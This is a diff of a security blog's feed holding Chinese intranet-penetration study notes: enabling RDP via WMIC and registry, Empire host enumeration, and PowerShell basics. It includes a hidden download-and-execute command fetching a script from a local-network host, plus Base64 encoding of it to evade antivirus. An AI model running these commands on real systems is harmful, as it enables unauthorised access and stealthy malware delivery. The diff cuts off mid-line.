+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;REG QUERY &lt;span class=&#34;token string&#34;&gt;&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;V PortNumber&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在 Windows Server 2003 中开启 3389 端口&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic path win32_terminalservicesetting where &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__CLASS &lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;=&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; call setallowtsconnections 1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在 Windows Server 2008 和 Windows Server 2012 中开启 3389 端口&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__CLASS &lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;=&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; call setallowtsconnections 1 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;TerminalName=&lt;span class=&#34;token string&#34;&gt;&#39;RDP-Tcp&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; call setuserauthenticationrequired 1 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;reg add &lt;span class=&#34;token string&#34;&gt;&#34;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;v fSingleSessionPerUser &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;t REG_DWORD &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;d 0 &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;f&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;自动收集本地信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自动收集本地信息&#34;&gt;#&lt;/a&gt; 自动收集本地信息&lt;/h2&gt;
+&lt;h3 id=&#34;wmic脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wmic脚本&#34;&gt;#&lt;/a&gt; wmic 脚本&lt;/h3&gt;
+&lt;p&gt;项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnV6enlzZWN1cml0eS5jb20vc2NyaXB0cy9maWxlcy93bWljX2luZm8ucmFy&#34;&gt;https://www.fuzzysecurity.com/scripts/files/wmic_info.rar&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;执行脚本后会将结果写入一个 html 文件。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/%E3%80%90%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E5%86%85%E7%BD%91%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.assets/image_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;empire下主机信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#empire下主机信息收集&#34;&gt;#&lt;/a&gt; Empire 下主机信息收集&lt;/h3&gt;
+&lt;p&gt;Empire 是一款针对 Windows 的渗透测试工具，与 MSF 类似。&lt;/p&gt;
+&lt;p&gt;Empire 提供了用于收集主机信息的模块。利用 &lt;code&gt;usemodule situational_awareness/host/winenum&lt;/code&gt;  模块，可以查看本机用户信息、系统基本信息、剪贴板等信息。&lt;/p&gt;
+&lt;p&gt;调用 &lt;code&gt;powershell/situational_awareness/host/computerdetails&lt;/code&gt;  模块可查看更丰富的信息，比如 RDP 登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。&lt;/p&gt;
+</content>
+        <category term="安全技术" scheme="http://gsh3ll.top/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" />
+        <category term="内网安全" scheme="http://gsh3ll.top/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" />
+        <updated>2021-12-19T07:27:41.000Z</updated>
+    </entry>
     <entry>
         <id>http://gsh3ll.top/2021/12/18/%E3%80%90%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E3%80%91PowerShell%E5%9F%BA%E7%A1%80/</id>
         <title>【内网安全笔记】PowerShell基础</title>
@@ -49,9 +179,7 @@
 &lt;li&gt;AllSigned：仅当前脚本受信任的发布者签名时才能运行。&lt;/li&gt;
 &lt;li&gt;Unrestricted：允许所有脚本运行。&lt;/li&gt;
 &lt;/ul&gt;
-&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;Set-ExecutionPolicy &amp;lt;policy name&amp;gt;    //使用该命令可以设置powershell的执行策略。
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;运行脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#运行脚本&#34;&gt;#&lt;/a&gt; 运行脚本&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Set-ExecutionPolicy&lt;/span&gt; &amp;lt;policy name&gt;    &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;使用该命令可以设置powershell的执行策略。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;运行脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#运行脚本&#34;&gt;#&lt;/a&gt; 运行脚本&lt;/h3&gt;
 &lt;p&gt;需要注意的是，想要运行一个 powershell 脚本，需要输入完整的路径和文件名，如 &lt;code&gt;C:\Scripts\a.ps1&lt;/code&gt; 。&lt;/p&gt;
 &lt;p&gt;如果 PowerShell 脚本文件刚好在系统目录中，在命令提示符后直接输入脚本文件名，例如 &lt;code&gt;.\a.ps1&lt;/code&gt;  即可运行脚本。&lt;/p&gt;
 &lt;h3 id=&#34;管道&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#管道&#34;&gt;#&lt;/a&gt; 管道&lt;/h3&gt;
@@ -69,60 +197,20 @@
 &lt;p&gt;-Noexit：执行后不退出 Shell，这在使用键盘记录等脚本时非常重要&lt;/p&gt;
 &lt;p&gt;-NonInteractive (-Nonl)：非交互模式，PowerShell 不为用户提供交互的提示&lt;/p&gt;
 &lt;h3 id=&#34;文件操作类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件操作类&#34;&gt;#&lt;/a&gt; 文件操作类&lt;/h3&gt;
-&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;新建目录test：New-Item test -ItemType directory 
-删除目录test：Remove-Item test 
-新建文件test.txt：New-Item test.txt -ItemType file 
-新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value &amp;quot;hello&amp;quot; 
-删除文件test.txt：Remove-Item test.txt 
-查看文件test.txt内容：Get-Content test.txt 
-设置文件test.txt内容t：Set-Content test.txt -Value &amp;quot;hello&amp;quot; 
-给文件test.txt追加内容：Add-Content test.txt -Value &amp;quot;,word!&amp;quot; 
-清除文件test.txt内容：Clear-Content test.txt
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;绕过本地权限并执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过本地权限并执行&#34;&gt;#&lt;/a&gt; 绕过本地权限并执行&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;新建目录test：&lt;span class=&#34;token function&#34;&gt;New-Item&lt;/span&gt; test &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ItemType directory &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;删除目录test：&lt;span class=&#34;token function&#34;&gt;Remove-Item&lt;/span&gt; test &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;新建文件test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt：&lt;span class=&#34;token function&#34;&gt;New-Item&lt;/span&gt; test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ItemType file &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;新建文件test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt，内容为 hello：&lt;span class=&#34;token function&#34;&gt;New-Item&lt;/span&gt; test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ItemType file &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;value &lt;span class=&#34;token string&#34;&gt;&#34;hello&#34;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;删除文件test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt：&lt;span class=&#34;token function&#34;&gt;Remove-Item&lt;/span&gt; test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;查看文件test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt内容：&lt;span class=&#34;token function&#34;&gt;Get-Content&lt;/span&gt; test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;设置文件test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt内容t：&lt;span class=&#34;token function&#34;&gt;Set-Content&lt;/span&gt; test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Value &lt;span class=&#34;token string&#34;&gt;&#34;hello&#34;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;给文件test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt追加内容：&lt;span class=&#34;token function&#34;&gt;Add-Content&lt;/span&gt; test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Value &lt;span class=&#34;token string&#34;&gt;&#34;,word!&#34;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;清除文件test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt内容：&lt;span class=&#34;token function&#34;&gt;Clear-Content&lt;/span&gt; test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;绕过本地权限并执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过本地权限并执行&#34;&gt;#&lt;/a&gt; 绕过本地权限并执行&lt;/h3&gt;
 &lt;p&gt;默认受限模式下执行脚本的情况：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;PS C:\Users\gsh3ll&amp;gt; powerShell.exe Get-ExecutionPolicy 
-Restricted 
-
-PS C:\Users\gsh3ll&amp;gt; PowerShell.exe -File t.ps1 
-无法加载文件 C:\Users\gsh3ll\t.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/? LinkID=135170 中的 about_Execution_Policies。 
-+ CategoryInfo : SecurityError: (:) []，ParentContainsErrorRecordException 
-+ FullyQualifiedErrorId : UnauthorizedAccess
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里系统会提示在此系统上禁止运行脚本，但加上  &lt;code&gt;-ExecutionPolicy Bypass&lt;/code&gt;  即可绕过这个限制&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;PS C:\Users\gsh3ll&amp;gt; cat .\t.ps1 echo &amp;quot;Hello gsh3ll&amp;quot; 
-PS C:\Users\gsh3ll&amp;gt; PowerShell.exe -ExecutionPolicy Bypass -File t.ps1 
-hello gsh3ll
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;/images/PowerShell%E5%9F%BA%E7%A1%80.assets/1601818537336-69dc453b-7315-4f3a-be26-efd9b38d67ce.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;PS&lt;/span&gt; C:\Users\gsh3ll&gt; powerShell&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe &lt;span class=&#34;token function&#34;&gt;Get-ExecutionPolicy&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Restricted &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;PS&lt;/span&gt; C:\Users\gsh3ll&gt; PowerShell&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;File t&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps1 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;无法加载文件 C:\Users\gsh3ll\t&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;go&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;microsoft&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;fwlink&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;? LinkID=135170 中的 about_Execution_Policies。 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; CategoryInfo : SecurityError: &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;:&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;，ParentContainsErrorRecordException &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; FullyQualifiedErrorId : UnauthorizedAccess&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里系统会提示在此系统上禁止运行脚本，但加上  &lt;code&gt;-ExecutionPolicy Bypass&lt;/code&gt;  即可绕过这个限制&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;PS&lt;/span&gt; C:\Users\gsh3ll&gt; &lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;\t&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps1 &lt;span class=&#34;token function&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Hello gsh3ll&#34;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;PS&lt;/span&gt; C:\Users\gsh3ll&gt; PowerShell&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ExecutionPolicy Bypass &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;File t&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps1 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hello gsh3ll&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/images/PowerShell%E5%9F%BA%E7%A1%80.assets/1601818537336-69dc453b-7315-4f3a-be26-efd9b38d67ce.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;h3 id=&#34;绕过本地权限并隐藏执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过本地权限并隐藏执行&#34;&gt;#&lt;/a&gt; 绕过本地权限并隐藏执行&lt;/h3&gt;
 &lt;p&gt;加入 &lt;code&gt;-WindowStyle Hidden -NoLogo -NonInteractive -NoProfile&lt;/code&gt;  即可隐藏执行。&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File t.ps1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;下载远程脚本绕过权限并隐藏执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载远程脚本绕过权限并隐藏执行&#34;&gt;#&lt;/a&gt; 下载远程脚本绕过权限并隐藏执行&lt;/h3&gt;
-&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile &amp;quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://172.16.214.1:8000/t.ps1&#39;)&amp;quot;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;或者&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP &amp;quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://172.16.214.1:8000/t.ps1&#39;)&amp;quot;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;使用base64对powershell-命令进行编码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用base64对powershell-命令进行编码&#34;&gt;#&lt;/a&gt; 使用 Base64 对 PowerShell 命令进行编码&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PowerShell&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ExecutionPolicy Bypass &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;WindowStyle Hidden &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;NoLogo &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;NonInteractive &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;NoProfile &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;File t&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;下载远程脚本绕过权限并隐藏执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载远程脚本绕过权限并隐藏执行&#34;&gt;#&lt;/a&gt; 下载远程脚本绕过权限并隐藏执行&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PowerShell&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ExecutionPolicy Bypass &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;WindowStyle Hidden &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;NoLogo &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;NonInteractive &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;NoProfile &lt;span class=&#34;token string&#34;&gt;&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://172.16.214.1:8000/t.ps1&#39;)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;或者&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PowerShell&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Exec Bypass &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;W Hidden &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;NoLogo &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;NonI &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;NoP &lt;span class=&#34;token string&#34;&gt;&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://172.16.214.1:8000/t.ps1&#39;)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;使用base64对powershell-命令进行编码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用base64对powershell-命令进行编码&#34;&gt;#&lt;/a&gt; 使用 Base64 对 PowerShell 命令进行编码&lt;/h3&gt;
 &lt;p&gt;使用 Base64 对 PowerShell 命令进行编码的目的是混淆和压缩代码，从而避免脚本因为一些特殊字符被杀毒软件查杀。需要使用下面脚本进行编码：&lt;/p&gt;
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhcmtvcGVyYXRvci9wb3dlcnNoZWxsX3NjcmlwdHMvbWFzdGVyL3BzX2VuY29kZXIucHk=&#34;&gt;https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py&lt;/span&gt;&lt;/p&gt;
 &lt;p&gt;先将要执行的命令保存到文本文件（txt）中，之后执行  &lt;code&gt;python ps_encoder.py -s raw.txt&lt;/code&gt;  即可。&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;&amp;gt;cat tmp.txt IEX(New-Object Net.WebClient).DownloadString(&#39;http://172.16.214.1:8000/t.ps1&#39;) 
-&amp;gt;python ps_encoder.py -s raw.txt SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;使用 –Enc 指定 Base64 编码内容&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA
-
-&lt;/code&gt;&lt;/pre&gt;
-</content>
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; tmp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt &lt;span class=&#34;token function&#34;&gt;IEX&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;New-Object&lt;/span&gt; Net&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;WebClient&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;DownloadString&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;http://172.16.214.1:8000/t.ps1&#39;&lt;/span&gt;&lt;span class=&#34;token 